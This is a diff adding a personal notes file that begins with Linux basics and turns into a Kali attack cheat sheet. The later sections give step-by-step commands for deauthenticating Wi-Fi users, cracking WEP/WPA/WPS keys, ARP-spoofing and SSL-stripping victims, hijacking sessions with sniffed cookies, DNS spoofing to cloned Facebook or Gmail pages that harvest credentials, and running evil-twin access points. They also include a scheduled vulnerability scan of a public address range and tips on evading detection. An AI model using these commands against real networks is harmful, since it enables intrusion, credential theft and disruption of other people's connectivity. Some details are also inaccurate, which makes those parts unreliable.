@@ -1,0 +1,1451 @@
+Basic Commands:-
+
+1>pwd --- shows present working directory.
+2>cd --- to change directory.
+3>ls --- show contents of a directory.
+4>ls -l --- shows detailed information about the files in a directory.
+5>ls -al ---will show all files including hidden files along with info.
+6>cat [filename] --- displays content of files.
+7>more [filename] --- like cat but shows file contents in sections.
+8>less [filename] --- similar to more command but has searching capabilities, use forward 9>slash and enter words your searching for.
+10>cat [filename] | grep [filter text] --- it enables us to filter the content of a file for display.
+11>whoami --- shows name of user we are logged in as.
+12>touch [filename] --- creates new file.
+13>mkdir [dir name] --- creates new directory.
+14>man [program name] --- opens manual pages for the program.
+15>cp [filename] / [path of folder to be coppied in] --- copy a file.
+16>mv [path of file] /[destination path] --- move file from one place to another.
+17>mv [filename] [new filename] --- this will rename the file.
+18>find [path of file (optional)] -name [filename] --- finds files in the system.
+19>which [filename] --- allows us to search for binaries that are in our path variable.
+20>whereis [filename] --- locate files in any directory, and in addition, it also locates the 21>files manual or man pages.
+22>apt-get update --- updates system from source repositories.
+23>apt-get upgrade --- upgrades the updates it checked for.
+24>apt-get install [package name] --- installs package from repositories.
+25>tar [filename.tar] --- untar and uncompress files.
+26>gcc [filename] --- compile the source code of the downloaded file.
+27>dhclient --- calls the DHCP server and changes the ip addresses.
+28>dig [website domain name] ns --- gives info about its name server.
+29>dig [website domain name] mx --- gives info about its email server.
+30>chmod -[permission can be x, r or w] [777, 755,(4,2,1)] filename --- used to change permissions of a file to read, write, executable or all.
+31>ps aux --- see all the processes running on your system, along with its PID, user, %cpu etc.
+32>top --- only shows us the processes using the most resources and it's dynamic, meaning that it is gives us a real-time look at our processes.
+33>kill [PID] --- used to kill processes.
+34>kill -9 [PID] --- kills process forcefully.
+35>nice -n [value -20 to 19 lower being greater] [command we wish to run] --- increases the priority of a process.
+36>renice [value] [pid] --- resets the priority.
+37>set --- used to see environment variables. We can then change their values. this will be reset when we close the terminal(active environment). 
+38>export [variable name] --- exports the new value we assigned so that it will persist in the file even if we close the current running envronment.
+39>PS1= "[new name]" --- used to change name of prompt.
+40>export PS1 --- used so that the new name assigned to the prompt will persist as many times we open or close the terminal. 
+41>echo=$PATH --- shows us the path variable.
+42>nl [filename] --- display a file with line number.
+43>uname -a --- gives informations about the kernel.
+44>sysctl -a --- shows kernel processes, memory allocated etc. to make changes permanent we can edit the sysctl.conf file to tune the kernel of our system. 
+45>lsmod --- lists the important modules of the kernel.
+46>insmod ---  load or insert a module in the kernel.
+47>rmmod --- remove a module from the  kernel.
+48>modprobe -l --- show all modules installed in the kernel.
+49>modprobe -r --- remove modules from kernel.
+50>ls -l /etc/modprobe.d/ --- list configuration and permissions of installed modules.
+51>mount -t [filesystemtype] [location] --- it will "mount" a filesystem of the type (-t) at the location specified.
+52>umount --- used to unmount deriver mounted.
+53>ln -s [filename] [new symbolic file name] --- creates a symbolic link between the file and the symbolic file. The symbolic file only stores the path (absolute/relative path) of the original file. The symbolic file is just a pointer to the actual file we want to access. Symbolic file will be created upon command execution.
+54>ln [filename] [hard link file name] --- makes a hard link between an existing file and a newly created file. Hard files share the same information node and have the same size.
+
+55>tar -cvf [compressed filename].tar [filename1] [filename2] [filename3]... --- Used to create a archieved file consisting of one or more files.
+56>tar -tvf [filename].tar --- shows contents of the archieved file.
+57>tar -xvf [filename].tar --- Extracts tar file.
+58>gzip [filename].tar --- will compress and reduce size of the tar file. //zip and unzip can be used for files with any extentions.
+59>gunzip [filename].tar --- will decompress the tar file.
+60>compress [filename].tar --- will compress and reduce size of the tar file. //zip and unzip can be used for files with any extentions.
+61>uncompress [filename].tar --- will decompress the tar file.
+
+62>df --- it will provide us with basic information on any hard disks or mounted drives such as CD, DVD, or flash drives. 
+
+63>dpkg -i [package_name.deb] --- to install a .deb package
+
+
+To push a process into the background jst place & after the command while you execute it.
+
+-----------------------------------------------------------------------------------------------------------
+Port numbers and services running on them:
+
+-Ping(ICMP echo) shows ICMP traffic is allowed to and from the host
+-TCP port 21 -> FTP is running
+-TCP port 23 -> telnet is running
+-TCP port 25 / 465 -> SMTP / SMTPS
+-TCP port 110 / 995 -> POP3 / POP3S
+-TCP port 143 / 993 -> IMAP / IMAPS
+-TCP/UDP port 53 -> DNSserver running
+-TCP port 83, 443, 8080 -> web server or proxy running
+-TCP/UDP port 135, 137, 138, 139 and especially 445 -> windows host is running
+
+
+-----------------------------------------------------------------------------------------------
+Start-Up Scripts:
+
+In Linux, the boot-up process begins with the BIOS (basic input/output system), then the MBR (master boot record) executes GRUB (GRand Unified Bootloader), then the kernel executes the init (initialization, or first process), and then, finally, the runlevel program is executed from /etc/rc.d.
+Linux systems can have multiple runlevels. Kali, being a Debian-based Linux distribution, usually boots into runlevel 2.
+Which is multi user mode. runlevel 1 is single user mode.
+
+init is the first process that our system runs. This init process then hands over the boot-up processes to rc.d daemon.
+
+Got to init directory
+
+cd /etc/init.d 
+ls -l
+
+the files we see here are the ones that can be executed by init upon boot. In the directory find the file rc.local and open it in a text editor
+
+gedit /etc/init.d/rc.local.
+
+Upon installing any program it will place a script in the /etc/init.d directory. If you compile a program from the source code then this script wont be placed. In this case create a file with the name of the program and place it this folder. In that file store the command to start that particular program.
+ex. /usr/sbin/snort -D -c /etc/snort/snort.conf -l /var/log/snort (here snort is the program used). Make certain it has execute privilages(755).
+
+now open the rc.local file in a text editor and at the end of the document add the necessary commands to start the processes you wish to start at boot.
+
+etc/init.d [filename / script of the program ] start
+
+Also add the command for preparing the interface if needed by the process we are starting at boot.
+-----------------------------------------------------------------------------------------------
+Apache & MySql:
+
+Starting the Apache server:
+
+apache2ctl [start|stop|restart|graceful] --- start stop apache server. (Files saved in /var/www)
+Configure Apache:
+gedit /etc/apache2/apache2.conf
+
+Start MySql:
+
+service mysql start
+
+mysql -h [hostname(localhost)] -u root --- opens mysql prompt
+SET PASSWORD FOR root@localhost=PASSWORD('<your password>'); -----sets password on root@localhost. 
+
+Once done inorder to open root@localhost :
+mysql -h localhost -u root -p
+
+mysql -u [username root in most cases] -p --- this will log us into the mysql prompt as root. 
+
+By default mysql starts on the local host but we can start it on remote sites or web servers as well:
+
+mysql -u root -p [ip adress of the site or computer]
+
+After entering the mysql prompt all commands should end with a ; or /g
+
+To see all databases:
+show databases;
+
+Connect to the desired db:
+use [database name];
+
+To show tables in that db:
+show tables;
+
+Show structure of table:
+describe [table name];
+
+Select data:
+SELECT [column] FROM [table name];
+
+To export data to a directory:
+mysql --tab = [/directory we want to dump data in] --user [username root] -p [database name] [table name];
+This will create two files in the directory selected. One will be a .sql file and the other will be a .txt file. the .sql file contains the script to create the necessary tables to hold the data and the .txt file hold the data.
+
+-----------------------------------------------------------------------------------------------
+Scheduling Tasks: Scheduling scans and other jobs repeatedly at a specified time.
+
+We can do this using cron. 
+The cron daemon starts when the system boots and continues to run as long as the system is up and running. It reads a configuration file or files that consist of the jobs to be run and the schedule they are to be run on. Almost anything we can do from the command line can be scheduled to be done on a regular schedule using cron.
+
+find where cron configuration file and open it is:
+
+locate crontab 
+gedit /etc/crontab
+
+The fields of the crontab file are as follows:
+
+    Minute -- the exact minute when the command or will be run (0-59)
+    Hour -- the exact hour when the command or job will be run (0-23)
+    Day of the Month -- the exact day of the month when the command or job will be run (1-31)
+    Month -- the exact month when the command or job will be run (1-12)
+    Day of the week -- the exact day when you want the command to run (0-6, Sunday=0)
+    User -- the user permissions that the job will run as
+    Command -- the command or job you want to run
+The asterisk (*) in place of a numeric value, represents any, so it may be any day, any hour, or any minute.
+We can add jobs to this file, and schedule them to be executed at a required time.
+Fianally save and close the file.
+
+Ex. scheduling a heartbleed scan:
+
+Open that crontab file in any text editor. 
+To run nmap scanner each weeknight at 2:05 am. Simply add this line to our crontab file:
+
+05 2 * * 1,2,3,4,5 root nmap -sV --script=ssl-heartbleed 68.76.0.0/16
+
+This scan will run from monday to friday at 2:05 am looking for heartbleed vulnerabilities in a range of ip adresses.
+
+
+----------------------------------------------------------------------------------------------- 
+Logging:
+
+Log files store vital info about the activities going on inside the system, like which programs were run,  when they were run, error messages generated etc. We can use these log files to monitor our system and check if something is wrong, has anyone tried to hack our computer etc. Log files can also be used by forensics to find the pattern of the hackers method.
+
+Find rsyslog file:
+locate rsyslog
+
+open configuration file:
+gedit /etc/rsyslog.conf  
+We can change the log rules in this config file and manage the log file.
+
+The basic format for these rules is:
+
+facility.priority action
+
+The facility word references the program (such as mail, kernel, lpr, etc.) that generates the message to be logged. The priority keyword references the importance of the log message. Finally, the action keyword references the location that the log is to be sent to. This can be a file, remote computer, etc.
+
+The valid codes to put in place of the facility keyword in our configuration file rules include:
+
+    auth
+    authpriv
+    daemon
+    kern
+    lpr
+    mail
+    mark
+    news
+    security
+    syslog
+    user
+    uucp
+
+An asterisk (*) refers to all facilities. You can select more than one facility by listing them separated by a comma.
+
+The valid codes for priority are:
+
+    debug
+    info
+    notice
+    warning
+    warn
+    error
+    err
+    crit
+    alert
+    emerg
+    panic
+
+The priority codes are listed from lowest (debug) priority to highest (emerg, panic). The warning is the same as warn, error is the same as err, and emerg is the same as panic. Error, warn, and panic are all deprecated and should not be used.
+
+The action is usually a file name with its location. For instance, /var/log/messages.
+
+we cant keep log files forever and deleteing them too frequently will harm their purpose, so we need to find a balance. The time frame can be fixed in the logrotate.conf present in the etc directory. By default the log rotate time is 4 weeks.
+
+-----------------------------------------------------------------------------------------------
+Inetd: The Super Daemon
+
+Daemons are processes in linux that run in the background. Erlier at startup all these daemon processes are started and run but this meant, consumption of more resources. So the internet daemon or inetd was created, which is a Super Daemon and is used to control all other daemons.
+In Kali its name is rlinetd.
+
+locate rlinetd
+
+gedit /etc/rlinetd.conf
+
+We can use this config file to enable and disable alot of services and make our system more secure. Or we can gain access to someone elses inetd daemon and practically control their entire system.
+If an attacker were trying to exploit HTTP and HTTP was disabled in the rlinetd.conf, they would not have much luck.
+
+Don't Confuse Inetd with Init.d
+
+Linux novices often confuse init.d and inetd. Init.d is an initialization daemon that runs when the system starts up. It determines the runlevel and the daemons that activate at start up. When a computer is turned on, the kernel starts the systems init.d, which always has a Process ID (PID) of 1. 
+-----------------------------------------------------------------------------------------------
+Making a bash script:
+nano [script_name.sh]
+
+in the editor type:
+#!/bin/bash
+[
+<Body of script, consists of the coomands you want to be used>
+]
+
+Now save the script.
+use chmod to make it an executable file and run it to perform the desired function
+
+------------------------------------------------------------------------------------------------
+Using Tor:
+
+Install:
+apt-get install tor
+
+Start Tor:
+service tor start
+
+* Do not try to run tor browser as root!!!(can be done but dont)
+
+-----------------------------------------------------------------------------------------------
+Proxychains:
+
+Open conf file:
+nano etc/proxychains.conf 
+
+uncomment dynamix_chains and comment static_chains. This is essential as many of the proxy servers we use are free and might be down from time to time. 
+What dynamic_chains allows us to do is that if one of them is down then it skips that proxy and moves to the next one. But static_chain follows a specific order. For our use dynamic_chain is essential.
+
+Check the format of entering proxys as defined in  the configuration file.
+Preferably use only socks5 proxys.
+We can add proxys ourselves but dont add alot of them as they tend to slow you down.
+We have tor as the first proxy.
+
+Proxychains also prevents dns leaks. The dns option is provided in the conf file and is enabled by default.
+
+Start tor:
+service tor start
+
+Then before running any program use command proxychains.
+ex. proxychains firefox
+ex. proxychains nmap
+
+-----------------------------------------------------------------------------------------------
+DNS Settings:
+
+/etc/hosts --- it is the static DNS directory, if we want to assign a name to a particular ip address on our local network we can add the ip address with a name in this file
+
+nano /etc/hosts 
+
+[ip address] [name to be assigned]
+ex. 192.168.1.107 Rounak's System
+
+The primary file for pointing your system to a DNS server is the /etc/resolv.conf . It is here that we tell our system where to look for DNS services.
+
+nano /etc/resolv.conf
+
+in this file we can add name servers. We can have our own internal name server of a public DNS nameserver.
+
+nameserver [ip address]
+ex.nameserver 192.168.1.1
+
+nano /etc/nsswitch.conf --- Here is where we tell our system the order of where to look for name resolution. 
+
+**Changing DNS to prevent dns leaks & increase annonymity:
+
+Open dhclient config file:
+nano /etc/dhcp/dhclient.conf
+
+look for line "prepend domain name servers" and at the space after it remove the ip adressess written by default.
+Find a dns server from some other country. (Can use opendns ip addresses, one of them is 208.67.220.220	) 
+From their home page copy the opendns ip addresses. And paste them in the config file 
+ex. prepend domain-name-servers [ip address_1],[ip address_2]....  (we can use one or more ip addresses)
+
+This will mask our dns server and prevent us from getting detected.
+
+Though tor and use of proxychains takes care of it. Still we could do this for a more secure job.
+
+-----------------------------------------------------------------------------------------------
+VPN:
+open firefox
+
+type about:config
+A warnig page appeasers, proceed.
+
+In search bar type media.peerconnection.enabled
+Duble click on the search result, and set it to false.
+Close the browser and reopen it.
+
+Now look for a vpn service, download its vpn file. If zipped then unzip it. 
+
+In terminal, navigate to folder containing unzipped files and type:
+openvpn vpnname.vpn
+
+It will start running wait till it says "Initialization Sequence Completed"
+
+Try choosing VPNs which do not log data and choose a server in a country where data logging is not mandatory or not done at all.
+
+Good countries for VPN:
+Argentina - No data retention law
+Brazil - No data retention law
+Bulgaria - Data retention law not applicable to VPN providers
+Cyprus - Data retention law declared unconstitutional (?)
+Czech Republic - No data retention law (declared unconstitutional)
+Hong Kong - No data retention law (?)
+Iceland - No data retention period specified (?); good privacy laws
+Japan - No data retention law
+Luxemburg - Data retention law not applicable to VPN providers
+Netherlands - Data retention law not applicable to VPN providers
+Panama - No data retention law
+Romania - Data retention law declared unconstitutional
+Serbia - Data retention law not applicable to VPN providers (?)
+Sweden - Data retention law going into effect in May 2012, but (presumably) not applicable to VPNs
+Taiwan - No data retention law (?) + seemingly good privacy laws
+Ukraine - No data retention law
+
+
+-----------------------------------------------------------------------------------------------
+[wlan0/ wlan1 is name of interface......wifi card]
+-----------------------------------------------------------------------------------------------
+
+Changing ip address:
+
+We use tor for ip address spoofing but we can also change our ip address on the subnet of our own network. We can do this by:
+
+ifconfig [interface name] [new ip address]
+ex. ifconfig wlan1 192.168.1.180
+
+We can also change the netmask and broadcast address, if necessary, such as:
+
+ifconfig [interface name] [interface ip] netmask [new netmask ip] broadcast [new broadcast ip]
+ex.ifconfig eth0 192.168.1.115 netmask 255.255.255.0 broadcast 192.168.1.255
+
+-----------------------------------------------------------------------------------------------
+
+Enabling monitor mode on wireless interface:
+[wlan0/ wlan1 is name of interface......wifi card]
+
+ifconfig wlan0 down 
+iwconfig wlan0 mode monitor
+
+Changing mac address:
+
+macchanger --help
+macchanger {option} {interface} 
+macchanger -r wlan0
+ifconfig wlan0 up
+
+Check if any processes may cause problems:
+airmon-ng check wlan0
+
+Kill processes that may cause harm:
+
+kill [pid] [pid].....
+
+-----------------------------------------------------------------------------------------------
+
+To scan networks around and terget a selected network:
+
+airodump-ng wlan0 ------shows all networks around you
+
+airodump-ng --bssid [mac adress of target acess point] --channel [channel of target acess point] --write [name of file] wlan0  
+------collects packets from target network ,and write into the file name specified in -w option.(collect somewhere around 20k-30k packets)
+
+-----------------------------------------------------------------------------------------------
+
+Deauthentication attack:
+
+aireplay-ng --deauth [no. of deauthentication packets] -a [mac adress of target ap] -c [mac adress of client machine] wlan0
+--------deauthenticates machines from client access points.
+
+Send infinite deauth packets to all devices. This will deauthenticate everyone:
+aireplay-ng -0 0 -a [target ap mac address] wlan0
+
+-----------------------------------------------------------------------------------------------
+
+Fake authentication:
+
+aireplay-ng --fakeauth 0 -a [targetmac] -h [your mac] wlan0 
+----------fake authenticates you with the target network
+
+-----------------------------------------------------------------------------------------------
+
+WEP Cracking using packet injection:
+
+ARP Packet injection: 
+
+aireplay-ng --arpreplay -b [target mac] -h [your mac] wlan0
+------------will inject arp packets to increase data
+
+-----------------------------------------------------------------------------------------------
+
+Korek chopchop Packet injection: 
+
+find keystream:
+aireplay-ng --chopchop -b [target mac] -h [your mac] wlan0
+------------finds and saves keystream of a packet as .xor file
+
+-----------------------------------------------------------------------------------------------
+
+Forge a packet:
+packetforge-ng -0 -a [target mac] -h [your mac] -k [ip addres data needed in packet enter 255.255.255.255] -l [ip addres data needed in packet enter 255.255.255.255] -y [.xor file from last step] -w [output packet name]
+
+inject forged packet:
+aireplay-ng -2 -r [output packet name from last step] wlan0
+
+-----------------------------------------------------------------------------------------------
+
+Fragmeantation attack:   
+
+find keystream:
+aireplay-ng --fragment -b [target mac] -h [your mac] wlan0
+
+after this jst forge a packet and inject it into the network.(same as shown in above commands)
+
+-----------------------------------------------------------------------------------------------
+
+Cracking the key:
+aircrack-ng [name of file created using packet collection in airodump]
+------statistical attack should crack the network
+
+-----------------------------------------------------------------------------------------------
+
+WPA/WPA2 cracking:
+
+WPS cracking using rever in pixiewps(pixie dust attack):-
+
+Detect which wpa/wpa2 networks have wps enabled and wps is not locked:
+
+wash -i [wifi card with monitor mode]
+
+time reaver -i [name of card in monitor mode] -c [channel of target ap] -b [target mac] -K 1
+(run airodump-ng on target ap first)
+
+the -k 1 option is used to run reaver in pixiewps mode 
+we can use the otipon time to record tthe time taken by reaver to crack the wps pin
+
+We can customize the attack by specifiying how many tries in how much time:
+
+reaver -i wlan0 -b [target ap mac] -r 2:60
+this will do 2 tires on wps pin in 60 seconds
+
+*Note:-
+We can use a trick to make our crack very fast if we have access to the router physically. The default wps pin is specified behind the routers, this is very rarely changed in companies. 
+We can get that wps pin, then run reaver  
+
+time reaver -i [name of card in monitor mode] -c [channel of target ap] -b [target mac] -pin=[the wps pin we found behind the router]
+
+ex. time reaver -i wlan1 -c 8 -b F4:F2:6D:B0:F4:CC --pin=46617583
+
+If the default pin is not changed and wps is enabled then reaver can crack the password in less than 1 sec.
+
+-----------------------------------------------------------------------------------------------
+
+Using Handshake file and a word list:
+1. caputre the handshake 
+2. run wodlist against handshake file.
+
+Capture Handshake:
+airodump-ng --bssid [] --channel [] --write [] wlan0 
+
+while this is running execute a deauthentication attack with less number of deauth packets, so a device on the network is disconnected and reconnected again.
+Once the device connetcs again , the handshake is captured. Save the airodump file(with .cap extention).
+
+We can use existing wordlists or create our own.(default wordlist rockyou.txt already exists in kali)
+
+-----------------------------------------------------------------------------------------------
+
+Creating wordlist using crunch:
+
+crunch [min][max] [characters=upper|lower|numbers|symbol] -t[pattern] -o [file name].
+
+ex. crunch 5 8 123asdadc -t a@@@@@@@1 -o wordlist
+
+ex. crunch 5 8 ascakjc23123@@ -o list
+
+Check man pages of crunch:
+man crunch
+
+When crunch runs it saves data on the system, but if you want to conserve space and are generating one for a particular attack
+
+ex. crunch 3 5 jiadfua1234 | aircrack-ng -w - [handshake_file.cap] -e [seeid of ap] 
+
+-----------------------------------------------------------------------------------------------
+
+Cracking key:
+ 
+aircrack-ng [handshake file name] -w [wordlist] wlan0
+
+ex. aircrack-ng handshake.cap -w sample-list wlan0
+
+-----------------------------------------------------------------------------------------------
+
+Break key quicker by making a rainbow table:
+
+combine each word in wordlist with essid by PMK(pairwise master key) algorithm to create the pmk. Makes cracking much faster.(but database created can be used only for one essid).
+
+Steps:-
+
+Create new db and importing passwords:
+airolib-ng [name of database to be created] --import passwd [wordlist file name]
+
+create a file nd store name/essid of target network:
+echo "name/essid of ap" > name of file. 
+
+import essid to database:
+airolib-ng [name of database] --import essid [name of file containing essid of target]
+
+create PMKs:-
+airolib-ng [db name] --batch
+ 
+now the essid is batched to the worlist passwords and pmk list is created
+
+Now to crack:
+aircrack-ng -r [database name] [handshake file name.cap]
+
+-----------------------------------------------------------------------------------------------
+
+Scan using netdiscover:
+
+netdiscover -i wlan0 -r [range]
+
+ex. netdiscover -i wlan0 -r 192.168.1.1/24 
+this will scan on network 192.168.1 from 192.168.1.1 to 192.168.1.244
+
+-----------------------------------------------------------------------------------------------
+Man In The Middle :-
+
+ARP Poisoning using arpspoof:-
+
+1.Tell target client that you are the router:
+arpspoof -i wlan0 -t [Target IP] [Acess Point IP]
+
+ex. arpspoof -i wlan0 -t 192.168.1.5 192.168.1.1
+
+2.Tell target router that you are the client:
+arpspoof -i wlan0 -t [Acess Point IP] [Target IP]
+
+ex. arpspoof -i wlan0 -t 192.168.1.1 192.168.1.5
+
+3.Enable IP forwarding to flow through your device without being dropped:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+to check if its set to 1:
+cat /proc/sys/net/ipv4/ip_forward
+
+-----------------------------------------------------------------------------------------------
+ARP spoofing using SSL strip:
+SSl strip is used to convert https to http.
+
+1.Install:
+apt-get install sslstrip
+
+2.Enable IP forwarding to flow through your device without being dropped:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+3.Changing firewall settings(resets each time we restart):
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+To check its working :
+iptables -t nat -L PREROUTING
+Will show that it is allowed to redirect from anywhere to anywhere
+
+5.Find Target ip using nmap & find router ip using command route.
+
+6.Tell target client that you are the router:
+arpspoof -i wlan0 -t [Target IP] [Acess Point IP]
+
+ex. arpspoof -i wlan0 -t 192.168.1.5 192.168.1.1
+
+7.Tell target router that you are the client:
+arpspoof -i wlan0 -t [Acess Point IP] [Target IP]
+
+ex. arpspoof -i wlan0 -t 192.168.1.1 192.168.1.5
+
+8. In case the port 8080 is closed on your system you will need to open it:
+iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+
+To check if its done:
+iptables -L INPUT 
+If "the tcp dpt: webcache" , then port 8080 is opened and operational
+
+9. Initiate SSL strip:
+sslstrip -l 8080
+
+we wont be monitoring the otuput of this command as it has alot of extra unnecessary info.
+
+10. Monitor the log file & sniff information:
+tail -f sslstrip.log
+-----------------------------------------------------------------------------------------------
+MITM ARP spoofing using Ettercap:
+
+Config file:
+nano etc/ettercap/etter.conf
+
+Go to the line which says "if you use iptables:" and uncomment the two lines below it.
+
+ettercap -Tq -M arp:remote -I wlan0 // --- this will target all devices in our system. wifi interface can be in managed mode as we dont need all packets around us only the ones that come to us.
+Basic commands will be written as ettercap starts. 
+
+To attack a particular target:
+ettercap -Tq -M arp:remote -i wlan0 /[ip address of target AP ]/ /[ip of target device]/
+ex. ettercap -Tq -M arp:remote -i /192.168.1.1// /192.168.1.102// (extra slashes as ipv6 is enabled.)
+This will do an ARP spoof between both the points we entered.
+
+Now enable ip forwarding: 
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Ettercap will now look for all important information. It will show any login information. If user uses https then we need to use other options.
+
+------------------------------------------------------------------------------------------------
+SSLStripping using Ettercap:
+Before starting the attack modify the config file:
+nano /etc/ettercap/etter.conf 
+Set the ec_uid & ec_gid to 0. 
+
+1> Redirect packets to sslstrip so that it downgrades HTTPS to HTTP:
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+Default port on which sslstrip listens is 10000
+
+2>Run SSL Strip:
+sslstrip -p
+We can run only sslstrip to analyze all requests but if we add -p it will analyze only POST requests
+
+3>ARP poisoning client and AP:(Do this on another terminal)
+ettercap -Tq -M arp:remote  -i wlan0 /[ip address of AP]// /[ip address of target client]// 
+ex. ettercap -Tq -M arp:remote -i /192.168.1.1// /192.168.1.102//
+Instead of ip address we can also use mac address or port. But we can do it if we are in a local connection.
+
+4>Now enable ip forwarding:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+-----------------------------------------------------------------------------------------------------
+Session Hijacking using Ettercap (To bypass the remember me feature):
+
+If the user does not even enter the user credentials, and uses the remember me option, then we will sniff the cookies instead of the passwords. We can then inject the cookies into our browser which will allow us login to the target account.
+This technique only works on sites using HTTP, or sites which use HTTPS only for login, not for rest of the pages.
+
+1> ARP Poisoning:
+ettercap -Tq -M arp:remote -i /192.168.1.1// /192.168.1.102//
+
+2>Enable ip forwarding:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+3>Download and run cookiecadger:
+Download from www.cookiecadger.com and run it.
+ex. java -jar CookieCadger-1.0.7.jar (run the version you have downloaded)
+
+In CookieCadger select the wireless interface and start capturing cookies. As the targer user browses through web pages cookie-cadger captures all the cookies. 
+Select the website you are interested in and see if cookies were captured. If yes then click, 'load domain cookies' and it will open a webpage with the account of the target user loged in. 
+
+-----------------------------------------------------------------------------
+DNS Spoofing using Ettercap:
+
+1>Modify the rules file:
+nano /etc/ettercap/etter.dns
+add rules:
+ex. *.facebook.com A 192.168.1.101(ip of your own machine/ can be anyother machine as well.)
+
+2>start local server:
+service apache2 start.
+We can clone websites and place them in the apache server folder, so that the users will be redirected to the fake website.
+
+3>ARP Poisoning with dns_spoof plugin:
+ettercap -Tq -M arp:remote -P dns_spoof -i /192.168.1.1/ /192.168.1.102/
+
+*Note: The -P is for adding plugins. Ettercap has various plugins. WE can access this list of plugins by running a basic ettercap command first, and the pressing p.
+All we need to do is add the plugin name after the -P option in the command.
+We can also use plugins by running a basic ettercap command, and then writing the name of the plugin while the ettercap command is running. 
+
+4>Enable ip forwarding:
+echo 1 > /proc/sys/net/ipv4/ip_forward 
+
+Now if the user types facebook.com then he/she will be sent to the fake page hosted on our machine. The credentials they enter their will be sniffed by ettercap.
+
+--------------------------------------------------------------------------------------------------
+DNS Spoofing/Hijacking: (change settings to redirect users and get info & credentials)
+
+Go to the admin page of the router, enter admin id and password. On most routers you will find the interface settings or setup under which you will find the dns settings. Choose the use of user discovered dns server only. And enter the ip address of the machine which you will be using as the dns server (your computer). In the secondary dns you can enter the google dns or opendns ip address.
+
+Use DNS Chef to redirect traffic to cloned websites:
+
+dnschef --fakeip=[ip address of your system, acting as fake dns server (interface accessing internet ip address)] --fakedomains=[website name.com] --interface=[ip address of your system interface /(if not sure can enter 0.0.0.0)]  
+
+By executing this command we have specified that all users who request for the website we entered will be resolved to the ip address we specified insted of being resolved to the ip address of that website.
+
+Keep this open throughout the process. If it is closed then dns setting wont work
+
+Start apache server:
+service apache2 start
+
+Now open setoolkit:
+
+Start setoolkit inside /var/www so that when you clone a site all its files are saved to that directory, which will then be used by our apache webserver. If you run setoolkit on any other directory, then manually move the cloned website files to /var/www 
+
+settoolkit --- this will open a prompt with many options. 
+Here we will use it to clone a website, so once open press 1 for social engineering attacks. then hit 2 for website attack vectors. Then press 3 for credential harvester attack. Finally choose 2 for site cloner. we will need the ip address of our system(ifconfig and ip of interface connected to the internet).
+Then we will be asked to enter a fake domain name. Enter http://[domain of site ur cloning].
+
+To check if the cloning process worked enter the ip address of your system and you should see the clone of th website you wanted to clone.  
+
+Theres a javascript in place inside the cloned website which will extract all credentials entered into the website.
+
+*NOTE:- If you are cloning websites like facebook or gmail then many images used on the cloned page are retrieved from HTTPS links. So after cloning such websites, open the code of the cloned page. Find and replace all HTTPS in the code with HTTP. Save the code and check if the page still looks the same as before.
+Also change the title of the page.
+
+Go to:
+cd /var/ww/
+ls
+You will see a file called harvester_[date or something].txt
+
+Now,
+tail -f harvester_[date or something].txt 
+This will give us a live feed of the harvester file. Here we will get all the credentials entered on the website.
+
+If you close your dnschef during the process or as soon as you have found the credentials then it wont affect the user on the other end. The next request of the user will be resolved to the secondary dns server whose ip address we entered (preferably google 8.8.8.8 or opendns).
+
+If browsers have cached the data, then attack may not work perfectly or site may not load properly. Dont worry it will be okay once the user resets the browser. 
+
+If site is majorly broken then delete the files in www, and run the setoolkit part of the process again.
+
+---------------------------------------------------------------------------------------------
+Ettercap filters:
+
+Filters are files, and we can issue commands in them. We will have to create a filter and specify its purpose.
+Here we will use a filter to stop the devices from connecting to the internet. The device will be connected to the access point but will not have internet access.
+The commands we issue in these files will be carried out on all packets passing through our ARP poisoned network. 
+
+1> Creating the ettercap filter:
+echo "[command1];[command2];[command3];..." > [filtername].filter
+ex. echo "kill();drop();" > drop-packets.filter
+This command kills all the connections that go through the network, and the drop command drops all the packets that go through our network.
+We could also open a text file and write the commands into them.
+
+2> Compiling the filter:
+etterfilter [filtername.filter] -o [compiled_filename.ef]
+ex. etterfilter drop-packets.filter -o drop-packets.ef
+
+3> ARP poisoning using  ettercap with filter:
+ettercap -Tq -M arp:remote -F drop-packets.ef -i /192.168.1.1/ /192.168.1.102/
+
+This will restrict the client from connecting to the internet, though it will be connected to the network. 
+We can aslo run this for all the devices in the network:
+ettercap -Tq -M arp:remote -F drop-packets.ef -i //
+
+*Note: there are a few premade filters we can see them by opening the gui version of ettercap.
+
+-----------------------------------------------------------------------------------------------
+Evil Twin: (cloning an access point)
+
+To clone AP:
+airbase-ng -a [target ap mac] --essid ["target ap name"] --channel [ap channel] wlan0
+keep this running the whole time.
+
+Deauthenticate all users on the network. So that they reconnect back to the clone AP:
+aireplay-ng --deauth 0 -a [target ap mac] wlan0
+stop this after a while so that all deauthenticated devuces can now connect to the clone.
+
+Now provide internet access by making a bridge:
+apt-get install bridge-utils
+
+brctl addbr [bridge interface name]
+ex. brctl addbr evil
+
+brctl addif [bridge interface name] [interface eith internet access] // cant use the wireless card as it is now being used as the evil clone ap.
+ex. brctl addif evil eth0
+
+brctl addif [bridge interface name] [interface created by airbase] // interface created by airbase is usually at0
+ex. brctl addif evil at0
+
+Turn on the interfaces:
+ifconfig [airbase interface] 0.0.0.0 up
+ex.ifconfig at0 0.0.0.0 up
+
+ifconfig [bridge interface name] up
+ex.ifconfig evil up
+
+dhclient [bridge interface name]
+ex.dhcloent evil
+if this command doesnt work then use dhclient3 evil &
+
+Monitoring traffic on the clone ap:
+Use wireshark to analyse the traffic.
+
+---------------------------------------------------------------------------------------------
+Xplico network analyzer:
+
+Starting Xplico:
+service apache2 start
+service xplico start
+
+Opening Xplico interface:
+Open browser type 127.0.0.1:9876
+This will open the Xplico interface in the browser. 127.0.0.1 is the ip of the localhost, and 9786 is the port on which Xplico runs by default.
+The username and password both are xplico
+
+Go to case -> click live acqusition -> enter a name -> click create
+Open the new case you just created -> click sessions -> create new session
+Now do arp poisoning using ettercap
+We also have the option to upload a .cap file.
+
+go to xplico -> choose wlan0 -> click start
+ 
+Now we will receive packets that are being captured and gather information.
+Then we can go through the various otions available to analyze the packets.
+
+For example we can see which dns requests were made by any particular machine.
+In web we will be able to see all the urls visited.
+
